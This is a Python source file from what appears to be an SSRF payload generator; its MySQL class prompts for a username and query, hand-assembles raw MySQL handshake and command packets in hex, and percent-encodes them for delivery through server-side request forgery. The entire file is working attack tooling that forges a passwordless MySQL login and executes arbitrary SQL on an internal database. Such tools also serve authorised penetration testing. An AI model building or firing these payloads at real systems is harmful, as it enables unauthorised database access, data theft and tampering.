from .base import *

class MySQL(GENERATOR):
    
    requirement = ["user", "query"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 3306
        super().__init__(parser,options)
        print("\033[31m"+"For making it work username should not be password protected!!!"+ "\033[0m")
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.query == "":
            self.query = self.wizard()
        else:
            self.query = arg.query

        if arg.user == "":
            self.user = self.wizard_user()
        else:
            self.user = arg.user
    
    def wizard(self):  
        query = input("\033[96m" +"Give query to execute: "+ "\033[0m")
        return query
    
    def wizard_user(self):
        user = input("\033[96m" +"Give MySQL username: "+ "\033[0m")
        return user

    def generate(self):
        user = self.user
        query = self.query

        encode_user = encodehex(user)
        user_length = len(user)
        temp = user_length - 4
        length = encodehex(chr(0xa3+temp))

        dump = length + "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
        dump +=  encode_user
        dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
        dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
        dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"

        auth = dump.replace("\n","")

        p = self.get_payload(query,auth)
        self.set_mode(PAYLOAD_TYPE.NONE).set_payload(p)
        return super().generate()


    def get_payload(self, query, auth):
        if(query.strip()!=''):
            query = encodehex(query)
            query_length = '{:06x}'.format((int((len(query) / 2) + 1)))
            query_length = encodehex(decodehex(query_length)[::-1])
            # query_length = query_length.decode[::-1].encode('hex')
            pay1 = query_length + "0003" + query
            final = encode(auth + pay1 + "0100000001")
            return final
        else:
            return encode(auth)
        
def encodehex( s):
    final = ""
    for c in s:
        final += hex(ord(c)).replace("0x", "")
    return final
def decodehex( s):
    final = ""
    for i in range(0, len(s), 2):
        final += chr(int(s[i:i+2], 16))
    return final
    
def encode(s):
    a = [s[i:i + 2] for i in range(0, len(s), 2)]
    return "%".join(a)